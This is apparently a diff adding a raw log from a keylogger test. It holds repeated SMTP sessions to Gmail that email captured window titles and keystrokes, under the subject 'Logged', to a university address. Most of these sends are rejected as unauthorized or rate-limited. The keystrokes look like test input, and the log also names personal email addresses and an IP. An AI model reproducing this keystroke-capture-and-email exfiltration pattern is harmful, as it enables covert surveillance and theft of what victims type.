@@ -1,0 +1,107 @@
+Connecting....
+220 mx.google.com ESMTP v64-v6si26006488pfj.292 - gsmtp
+helo me.somepalace.com
+250 mx.google.com at your service
+MAIL FROM:<tasnimhia75@gmail.com>
+250 2.1.0 OK v64-v6si26006488pfj.292 - gsmtp
+RCPT TO:<bsse0930@iit.du.ac.bd>
+250 2.1.5 OK v64-v6si26006488pfj.292 - gsmtp
+DATA
+354  Go ahead v64-v6si26006488pfj.292 - gsmtp
+To:bsse0930@iit.du.ac.bd
+From:tasnimhia75@gmail.com
+Subject:Logged
+Command Prompt - main	06/07/18 00:14:04
+jhsound.txt - Notepad	06/07/18 00:14:34
+ooo  [LCtrl]s[LShift]ADVBGFGKIJKLMNOPQRSTUVWXYZ[LCtrl]s
+.
+550-5.7.1 [103.31.178.5] The IP you're using to send mail is not authorized to
+550-5.7.1 send email directly to our servers. Please use the SMTP relay at your
+550-5.7.1 service provider instead. Learn more at
+550 5.7.1  https://support.google.com/mail/?p=NotAuthorizedError v64-v6si26006488pfj.292quit
+550-5.7.1 [103.31.178.5] The IP you're using to send mail is not authorized to
+550-5.7.1 send email directly to our servers. Please use the SMTP relay at your
+550-5.7.1 service provider instead. Learn more at
+550 5.7.1  https://support.google.com/mail/?p=NotAuthorizedError v64-v6si26006488pfj.292Connecting....
+220 mx.google.com ESMTP j12-v6si12347351pgf.359 - gsmtp
+helo me.somepalace.com
+250 mx.google.com at your service
+MAIL FROM:<tasnimhia75@gmail.com>
+250 2.1.0 OK j12-v6si12347351pgf.359 - gsmtp
+RCPT TO:<bsse0930@iit.du.ac.bd>
+250 2.1.5 OK j12-v6si12347351pgf.359 - gsmtp
+DATA
+354  Go ahead j12-v6si12347351pgf.359 - gsmtp
+To:bsse0930@iit.du.ac.bd
+From:tasnimhia75@gmail.com
+Subject:Logged
+New Tab - Google Chrome	06/07/18 00:15:18
+hhjhuh[LShift]A[Enter]hhjhuhA - Google Search - Google Chrome	06/07/18 00:16:07
+[LShift]SFFGFGHHGHGJGYJUYHUYJUHHUKUKHK[Enter]
+.
+550-5.7.1 [103.31.178.5] The IP you're using to send mail is not authorized to
+550-5.7.1 send email directly to our servers. Please use the SMTP relay at your
+550-5.7.1 service provider instead. Learn more at
+550 5.7.1  https://support.google.com/mail/?p=NotAuthorizedError j12-v6si12347351pgf.359quit
+550-5.7.1 [103.31.178.5] The IP you're using to send mail is not authorized to
+550-5.7.1 send email directly to our servers. Please use the SMTP relay at your
+550-5.7.1 service provider instead. Learn more at
+550 5.7.1  https://support.google.com/mail/?p=NotAuthorizedError j12-v6si12347351pgf.359Connecting....
+220 mx.google.com ESMTP b13-v6si10412108plm.202 - gsmtp
+helo me.somepalace.com
+250 mx.google.com at your service
+MAIL FROM:<tasnimhia75@gmail.com>
+250 2.1.0 OK b13-v6si10412108plm.202 - gsmtp
+RCPT TO:<bsse0930@iit.du.ac.bd>
+250 2.1.5 OK b13-v6si10412108plm.202 - gsmtp
+DATA
+354  Go ahead b13-v6si10412108plm.202 - gsmtp
+To:bsse0930@iit.du.ac.bd
+From:tasnimhia75@gmail.com
+Subject:Logged
+sound.txt - Notepad	06/07/18 00:16:25
+ [LShift]AWESOME[Enter][LCtrl]s[LCtrl]c[LCtrl]s[LCtrl]d[LCtrl]f[LCtrl]s
+.
+421-4.7.0 [103.31.178.5      15] Our system has detected that this message is
+421-4.7.0 suspicious due to the very low reputation of the sending IP address.
+421-4.7.0 To protect our users from spam, mail sent from your IP address has
+421-4.7.0 been temporarily rate limited. Please visit
+421 4.7.quit
+421-4.7.0 [103.31.178.5      15] Our system has detected that this message is
+421-4.7.0 suspicious due to the very low reputation of the sending IP address.
+421-4.7.0 To protect our users from spam, mail sent from your IP address has
+421-4.7.0 been temporarily rate limited. Please visit
+421 4.7.Connecting....
+220 mx.google.com ESMTP q10-v6si24812663plr.557 - gsmtp
+helo me.somepalace.com
+250 mx.google.com at your service
+MAIL FROM:<tasnimhia75@gmail.com>
+250 2.1.0 OK q10-v6si24812663plr.557 - gsmtp
+RCPT TO:<bsse0930@iit.du.ac.bd>
+250 2.1.5 OK q10-v6si24812663plr.557 - gsmtp
+DATA
+354  Go ahead q10-v6si24812663plr.557 - gsmtp
+To:bsse0930@iit.du.ac.bd
+From:tasnimhia75@gmail.com
+Subject:Logged
+New Tab - Google Chrome	06/07/18 00:17:05
+i Command Prompt - main	06/07/18 00:17:37
+[LCtrl]csound.txt - Notepad	06/07/18 00:18:39
+[LShift]Bi[LShift]SMILLAH[Enter][LCtrl]seirlfeniflelnfeulreeigrghurgu[Enter]
+.
+421-4.7.0 [103.31.178.5      15] Our system has detected that this message is
+421-4.7.0 suspicious due to the very low reputation of the sending IP address.
+421-4.7.0 To protect our users from spam, mail sent from your IP address has
+421-4.7.0 been temporarily rate limited. Please visit
+421 4.7.quit
+421-4.7.0 [103.31.178.5      15] Our system has detected that this message is
+421-4.7.0 suspicious due to the very low reputation of the sending IP address.
+421-4.7.0 To protect our users from spam, mail sent from your IP address has
+421-4.7.0 been temporarily rate limited. Please visit
+421 4.7.Connecting....
+220 mx.google.com ESMTP a11-v6si7890280plp.108 - gsmtp
+helo me.somepalace.com
+250 mx.google.com at your service
+MAIL FROM:<tasnimhia75@gmail.com>
+250 2.1.0 OK a11-v6si7890280plp.108 - gsmtp
+RCPT TO:<bsse0930@iit.du.ac.bd>
